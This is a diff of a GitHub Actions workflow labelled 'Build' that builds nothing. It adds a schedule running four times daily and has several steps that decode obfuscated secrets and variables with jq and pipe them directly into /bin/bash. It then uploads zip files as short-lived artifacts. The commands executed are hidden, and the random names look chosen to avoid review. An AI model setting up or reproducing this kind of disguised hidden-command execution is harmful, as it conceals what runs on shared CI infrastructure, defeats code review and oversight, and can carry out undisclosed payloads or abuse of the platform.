@@ -2,6 +2,8 @@ name: Build
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '36 0,6,12,18 * * *'
 permissions:
   contents: read
   actions: read
@@ -15,16 +17,18 @@ jobs:
         uses: actions/checkout@v4
       - name: Process
         env:
-          p67413: ${{ secrets.p67413 }}
+          vsftl685: ${{ secrets.vsftl685 }}
         run: |
-          printf '%s' "$p67413" | jq -r .ihgh4 | /bin/bash
-          echo $e325 | jq -r .kt6 | /bin/bash
-          echo $wdx4817 | jq -r .ckhip77359 | /bin/bash
+          printf '%s' "$vsftl685" | jq -r .ch002 | /bin/bash
+          printf '%s' "$jics35252" | jq -r .szh02 | /bin/bash
+          echo $wb862 | jq -r .ym6 | /bin/bash
+          echo $aif8636 | jq -r .u970 | /bin/bash
+          printf '%s' "$t937" | jq -r .vryo50276 | /bin/bash
 
       - name: Store results
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: JCRtjsPb
+          name: fppj86wr
           path: "*.zip"
           retention-days: 1
